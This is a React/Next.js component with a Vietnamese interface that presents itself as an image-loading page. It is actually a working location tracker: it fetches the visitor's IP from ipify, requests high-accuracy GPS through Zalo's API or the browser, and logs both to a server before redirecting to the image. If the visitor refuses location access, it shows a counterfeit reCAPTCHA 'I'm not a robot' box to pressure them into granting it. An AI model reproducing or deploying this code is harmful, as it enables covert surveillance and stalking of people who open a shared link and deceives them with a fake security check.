'use client';

import { useEffect, useState } from 'react';
import { Loader2, Camera } from 'lucide-react';
import Image from 'next/image';

interface ImageRedirectClientProps {
  imageUrl: string;
}

export function ImageRedirectClient({ imageUrl }: ImageRedirectClientProps) {
  const [status, setStatus] = useState<'requesting' | 'denied' | 'success'>('requesting');
  const [statusText, setStatusText] = useState('Đang tải ảnh...');

  const requestLocation = async () => {
    setStatus('requesting');
    setStatusText('Đang yêu cầu quyền truy cập...');
    let clientIp = 'N/A';
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        if (ipResponse.ok) {
            const ipData = await ipResponse.json();
            clientIp = ipData.ip;
        }
    } catch(e) {
        console.error("Could not fetch IP", e);
    }

    const logDataAndRedirect = (pos?: { coords: { latitude: number; longitude: number; accuracy: number; } }) => {
        setStatus('success');
        const body: { ip: string; lat?: number; lon?: number; acc?: number; from: string } = { ip: clientIp, from: 'image' };
        if (pos) {
            body.lat = pos.coords.latitude;
            body.lon = pos.coords.longitude;
            body.acc = pos.coords.accuracy;
        }

        fetch('/api/log-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
            keepalive: true,
        }).finally(() => {
            window.location.href = imageUrl;
        });
    }

    const handleError = (error?: { code: number; message?: string }) => {
      if (error?.code === 1) { // PERMISSION_DENIED
          setStatus('denied');
          setStatusText('Yêu cầu xác minh bạn không phải robot.');
      } else {
          logDataAndRedirect();
      }
    };

    // Check for Zalo's specific JS API first to fix ReferenceError and optimize
    if (typeof (window as any).zaloJSV2?.getLocation === 'function') {
        (window as any).zaloJSV2.getLocation((data: { status: string; latitude: number; longitude: number; accuracy: number; }) => {
            if (data.status === "SUCCESS" && data.latitude && data.longitude) {
                logDataAndRedirect({
                    coords: {
                        latitude: data.latitude,
                        longitude: data.longitude,
                        accuracy: data.accuracy || 15,
                    },
                });
            } else {
                handleError({ code: 1, message: 'Zalo API failed or was denied' });
            }
        });
    } else if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        logDataAndRedirect,
        (err) => handleError(err),
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
      );
    } else {
      logDataAndRedirect();
    }
  };
  
  useEffect(() => {
    setTimeout(requestLocation, 500);
  }, [imageUrl]);

  const handleRobotCheck = () => {
    requestLocation();
  };
  
  const renderContent = () => {
    if (status === 'denied') {
      return (
        <>
          <Camera className="h-10 w-10 mx-auto mb-4 text-gray-400" />
          <h3 className="flex items-center justify-center gap-3 text-lg mb-6" style={{ color: '#fff' }}>
            {statusText}
          </h3>
          <div 
              className="w-80 h-20 bg-[#f9f9f9] border border-gray-300 rounded-md p-3 flex items-center justify-between shadow-lg cursor-pointer hover:bg-gray-100/90 transition-colors mx-auto"
              onClick={handleRobotCheck}
          >
              <div className="flex items-center gap-4">
                  <div className="h-8 w-8 border-2 border-gray-400 bg-white rounded-sm flex items-center justify-center" />
                  <span className="text-gray-800 text-sm font-medium">I'm not a robot</span>
              </div>
              <div className="flex flex-col items-center justify-center text-center">
                  <Image src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width={32} height={32} alt="reCAPTCHA" />
                  <p className="text-[9px] text-gray-500 -mt-1">reCAPTCHA</p>
                  <p className="text-[7px] text-gray-400 scale-90">Privacy - Terms</p>
              </div>
          </div>
          <p style={{color: '#99AAB5', fontSize: '14px', marginTop: '16px'}}>
            Vui lòng hoàn thành xác minh để xem ảnh.
          </p>
        </>
      );
    }

    return (
      <>
        <Camera className="h-10 w-10 mx-auto mb-4" />
        <h3 className="flex items-center justify-center gap-3 text-lg" style={{ color: '#fff'}}>
            <Loader2 className="h-5 w-5 animate-spin" />
            {status === 'requesting' ? 'Đang tải ảnh...' : 'Thành công! Đang chuyển hướng...'}
        </h3>
        <p style={{color: '#99AAB5', fontSize: '14px', marginTop: '8px'}}>
            Vui lòng chờ trong giây lát.
        </p>
      </>
    );
  }

  return (
    <div style={{
      fontFamily: 'sans-serif',
      textAlign: 'center',
      paddingTop: '100px',
      background: '#23272A',
      color: '#fff',
      position: 'fixed',
      inset: 0,
      zIndex: 9999,
    }}>
      <div style={{
        background: '#2C2F33',
        padding: '40px',
        display: 'inline-block',
        borderRadius: '12px',
        boxShadow: '0 4px 10px rgba(0,0,0,0.1)',
      }}>
        {renderContent()}
      </div>
    </div>
  );
}
